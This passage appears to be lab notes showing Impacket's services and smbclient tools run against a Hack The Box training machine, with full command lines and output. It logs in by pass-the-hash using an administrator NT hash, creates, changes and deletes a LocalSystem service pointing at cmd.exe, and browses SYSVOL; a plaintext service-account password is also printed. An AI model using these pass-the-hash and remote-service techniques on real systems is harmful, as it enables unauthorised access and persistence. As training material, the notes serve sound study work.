                           Wof -                              Windows Overlay File System Filter Driver -  RUNNING
                       ws2ifsl -        Windows Socket 2.0 Non-IFS Service Provider Support Environment -  RUNNING
                      wuauserv -                                                         Windows Update -  STOPPED
                        WudfPf -                            User Mode Driver Frameworks Platform Driver -  STOPPED
                        WUDFRd -                                                                 WUDFRd -  STOPPED
                       wudfsvc -                 Windows Driver Foundation - User-mode Driver Framework -  STOPPED
Total Services: 372
```
### status
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' status -name MpsSvc 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
Querying status for MpsSvc
                        MpsSvc -  RUNNING
```
### start
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' start -name MpsSvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Starting service MpsSvc
```
### stop
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' stop -name MpsSvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Stopping service MpsSvc
```
### config
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' config -name MpsSvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Querying service config for MpsSvc
TYPE              : 32 -  SERVICE_WIN32_SHARE_PROCESS  
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  1 -  NORMAL
BINARY_PATH_NAME  : C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
LOAD_ORDER_GROUP  : NetworkProvider
TAG               : 0
DISPLAY_NAME      : Windows Firewall
DEPENDENCIES      : mpsdrv/bfe/
SERVICE_START_NAME: NT Authority\LocalService
```
### create
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' create -name test -display test -path 'C:\Windows\System32\cmd.exe'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]


└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' config -name test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Querying service config for test
TYPE              : 16 -  SERVICE_WIN32_OWN_PROCESS  
START_TYPE        :  2 -  AUTO START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\cmd.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : test
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem
```
### change
```sh
# https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicetype?view=netframework-4.8.1#fields
# https://learn.microsoft.com/en-us/dotnet/api/system.serviceprocess.servicestartmode?view=netframework-4.8.1#fields

└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' change -name test -display test -service_type 32 -start_type 3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Changing service config for test
                                                                                                                                                                                

└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' config -name test 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Querying service config for test
TYPE              : 32 -  SERVICE_WIN32_SHARE_PROCESS  
START_TYPE        :  3 -  DEMAND START
ERROR_CONTROL     :  0 -  IGNORE
BINARY_PATH_NAME  : C:\Windows\System32\cmd.exe
LOAD_ORDER_GROUP  : 
TAG               : 0
DISPLAY_NAME      : test
DEPENDENCIES      : /
SERVICE_START_NAME: LocalSystem
```
### delete
```sh
└─$ impacket-services -debug -hashes ':32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator@10.129.95.210' delete -name test
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] StringBinding ncacn_np:10.129.95.210[\pipe\svcctl]
[*] Deleting service test
```


## smbclient
```sh
└─$ impacket-smbclient -debug 'htb.local/svc-alfresco:s3rvice@10.129.95.210'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Type help for list of commands
#
```
### help
```sh
#help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
```
### logoff
```sh
# logoff
#
```
### open
```sh
# open 10.129.95.210
[*] SMBv3.0 dialect used
```
### login_hash
```sh
# login_hash htb.local/administrator :32693b11e6aa90eb43d32c72a07ceea6
[*] USER Session Granted
```
### shares
```sh
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
```
### use
```sh
# use SYSVOL
```
### pwd
```sh
# pwd
/
```
### ls
```sh
# ls
drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 .
drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 ..
drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 htb.local
```
### cd
```sh
# cd htb.local
#
```
### tree
```sh
# tree
/htb.local/DfsrPrivate/ConflictAndDeleted
/htb.local/DfsrPrivate/Deleted
/htb.local/DfsrPrivate/Installing
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
/htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
/htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Finished - 25 files and folders
```
### cat
```sh
# cat /htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
[+] Encoding detection: ascii is most likely the one.
[General]
Version=6
```
### get
```sh
# get /htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
#
```
### info
```sh
# info
Version Major: 10
Version Minor: 0
Server Name: FOREST
Server Comment: 
Server UserPath: c:\
Simultaneous Users: 16777216
```
### who
```
# who
host:   \\10.10.16.20, user: administrator, active:  1209, idle:     0
host: \\[fe80::8ac:ee0f:f73e:1363], user: FOREST$, active:     8, idle:     8
```
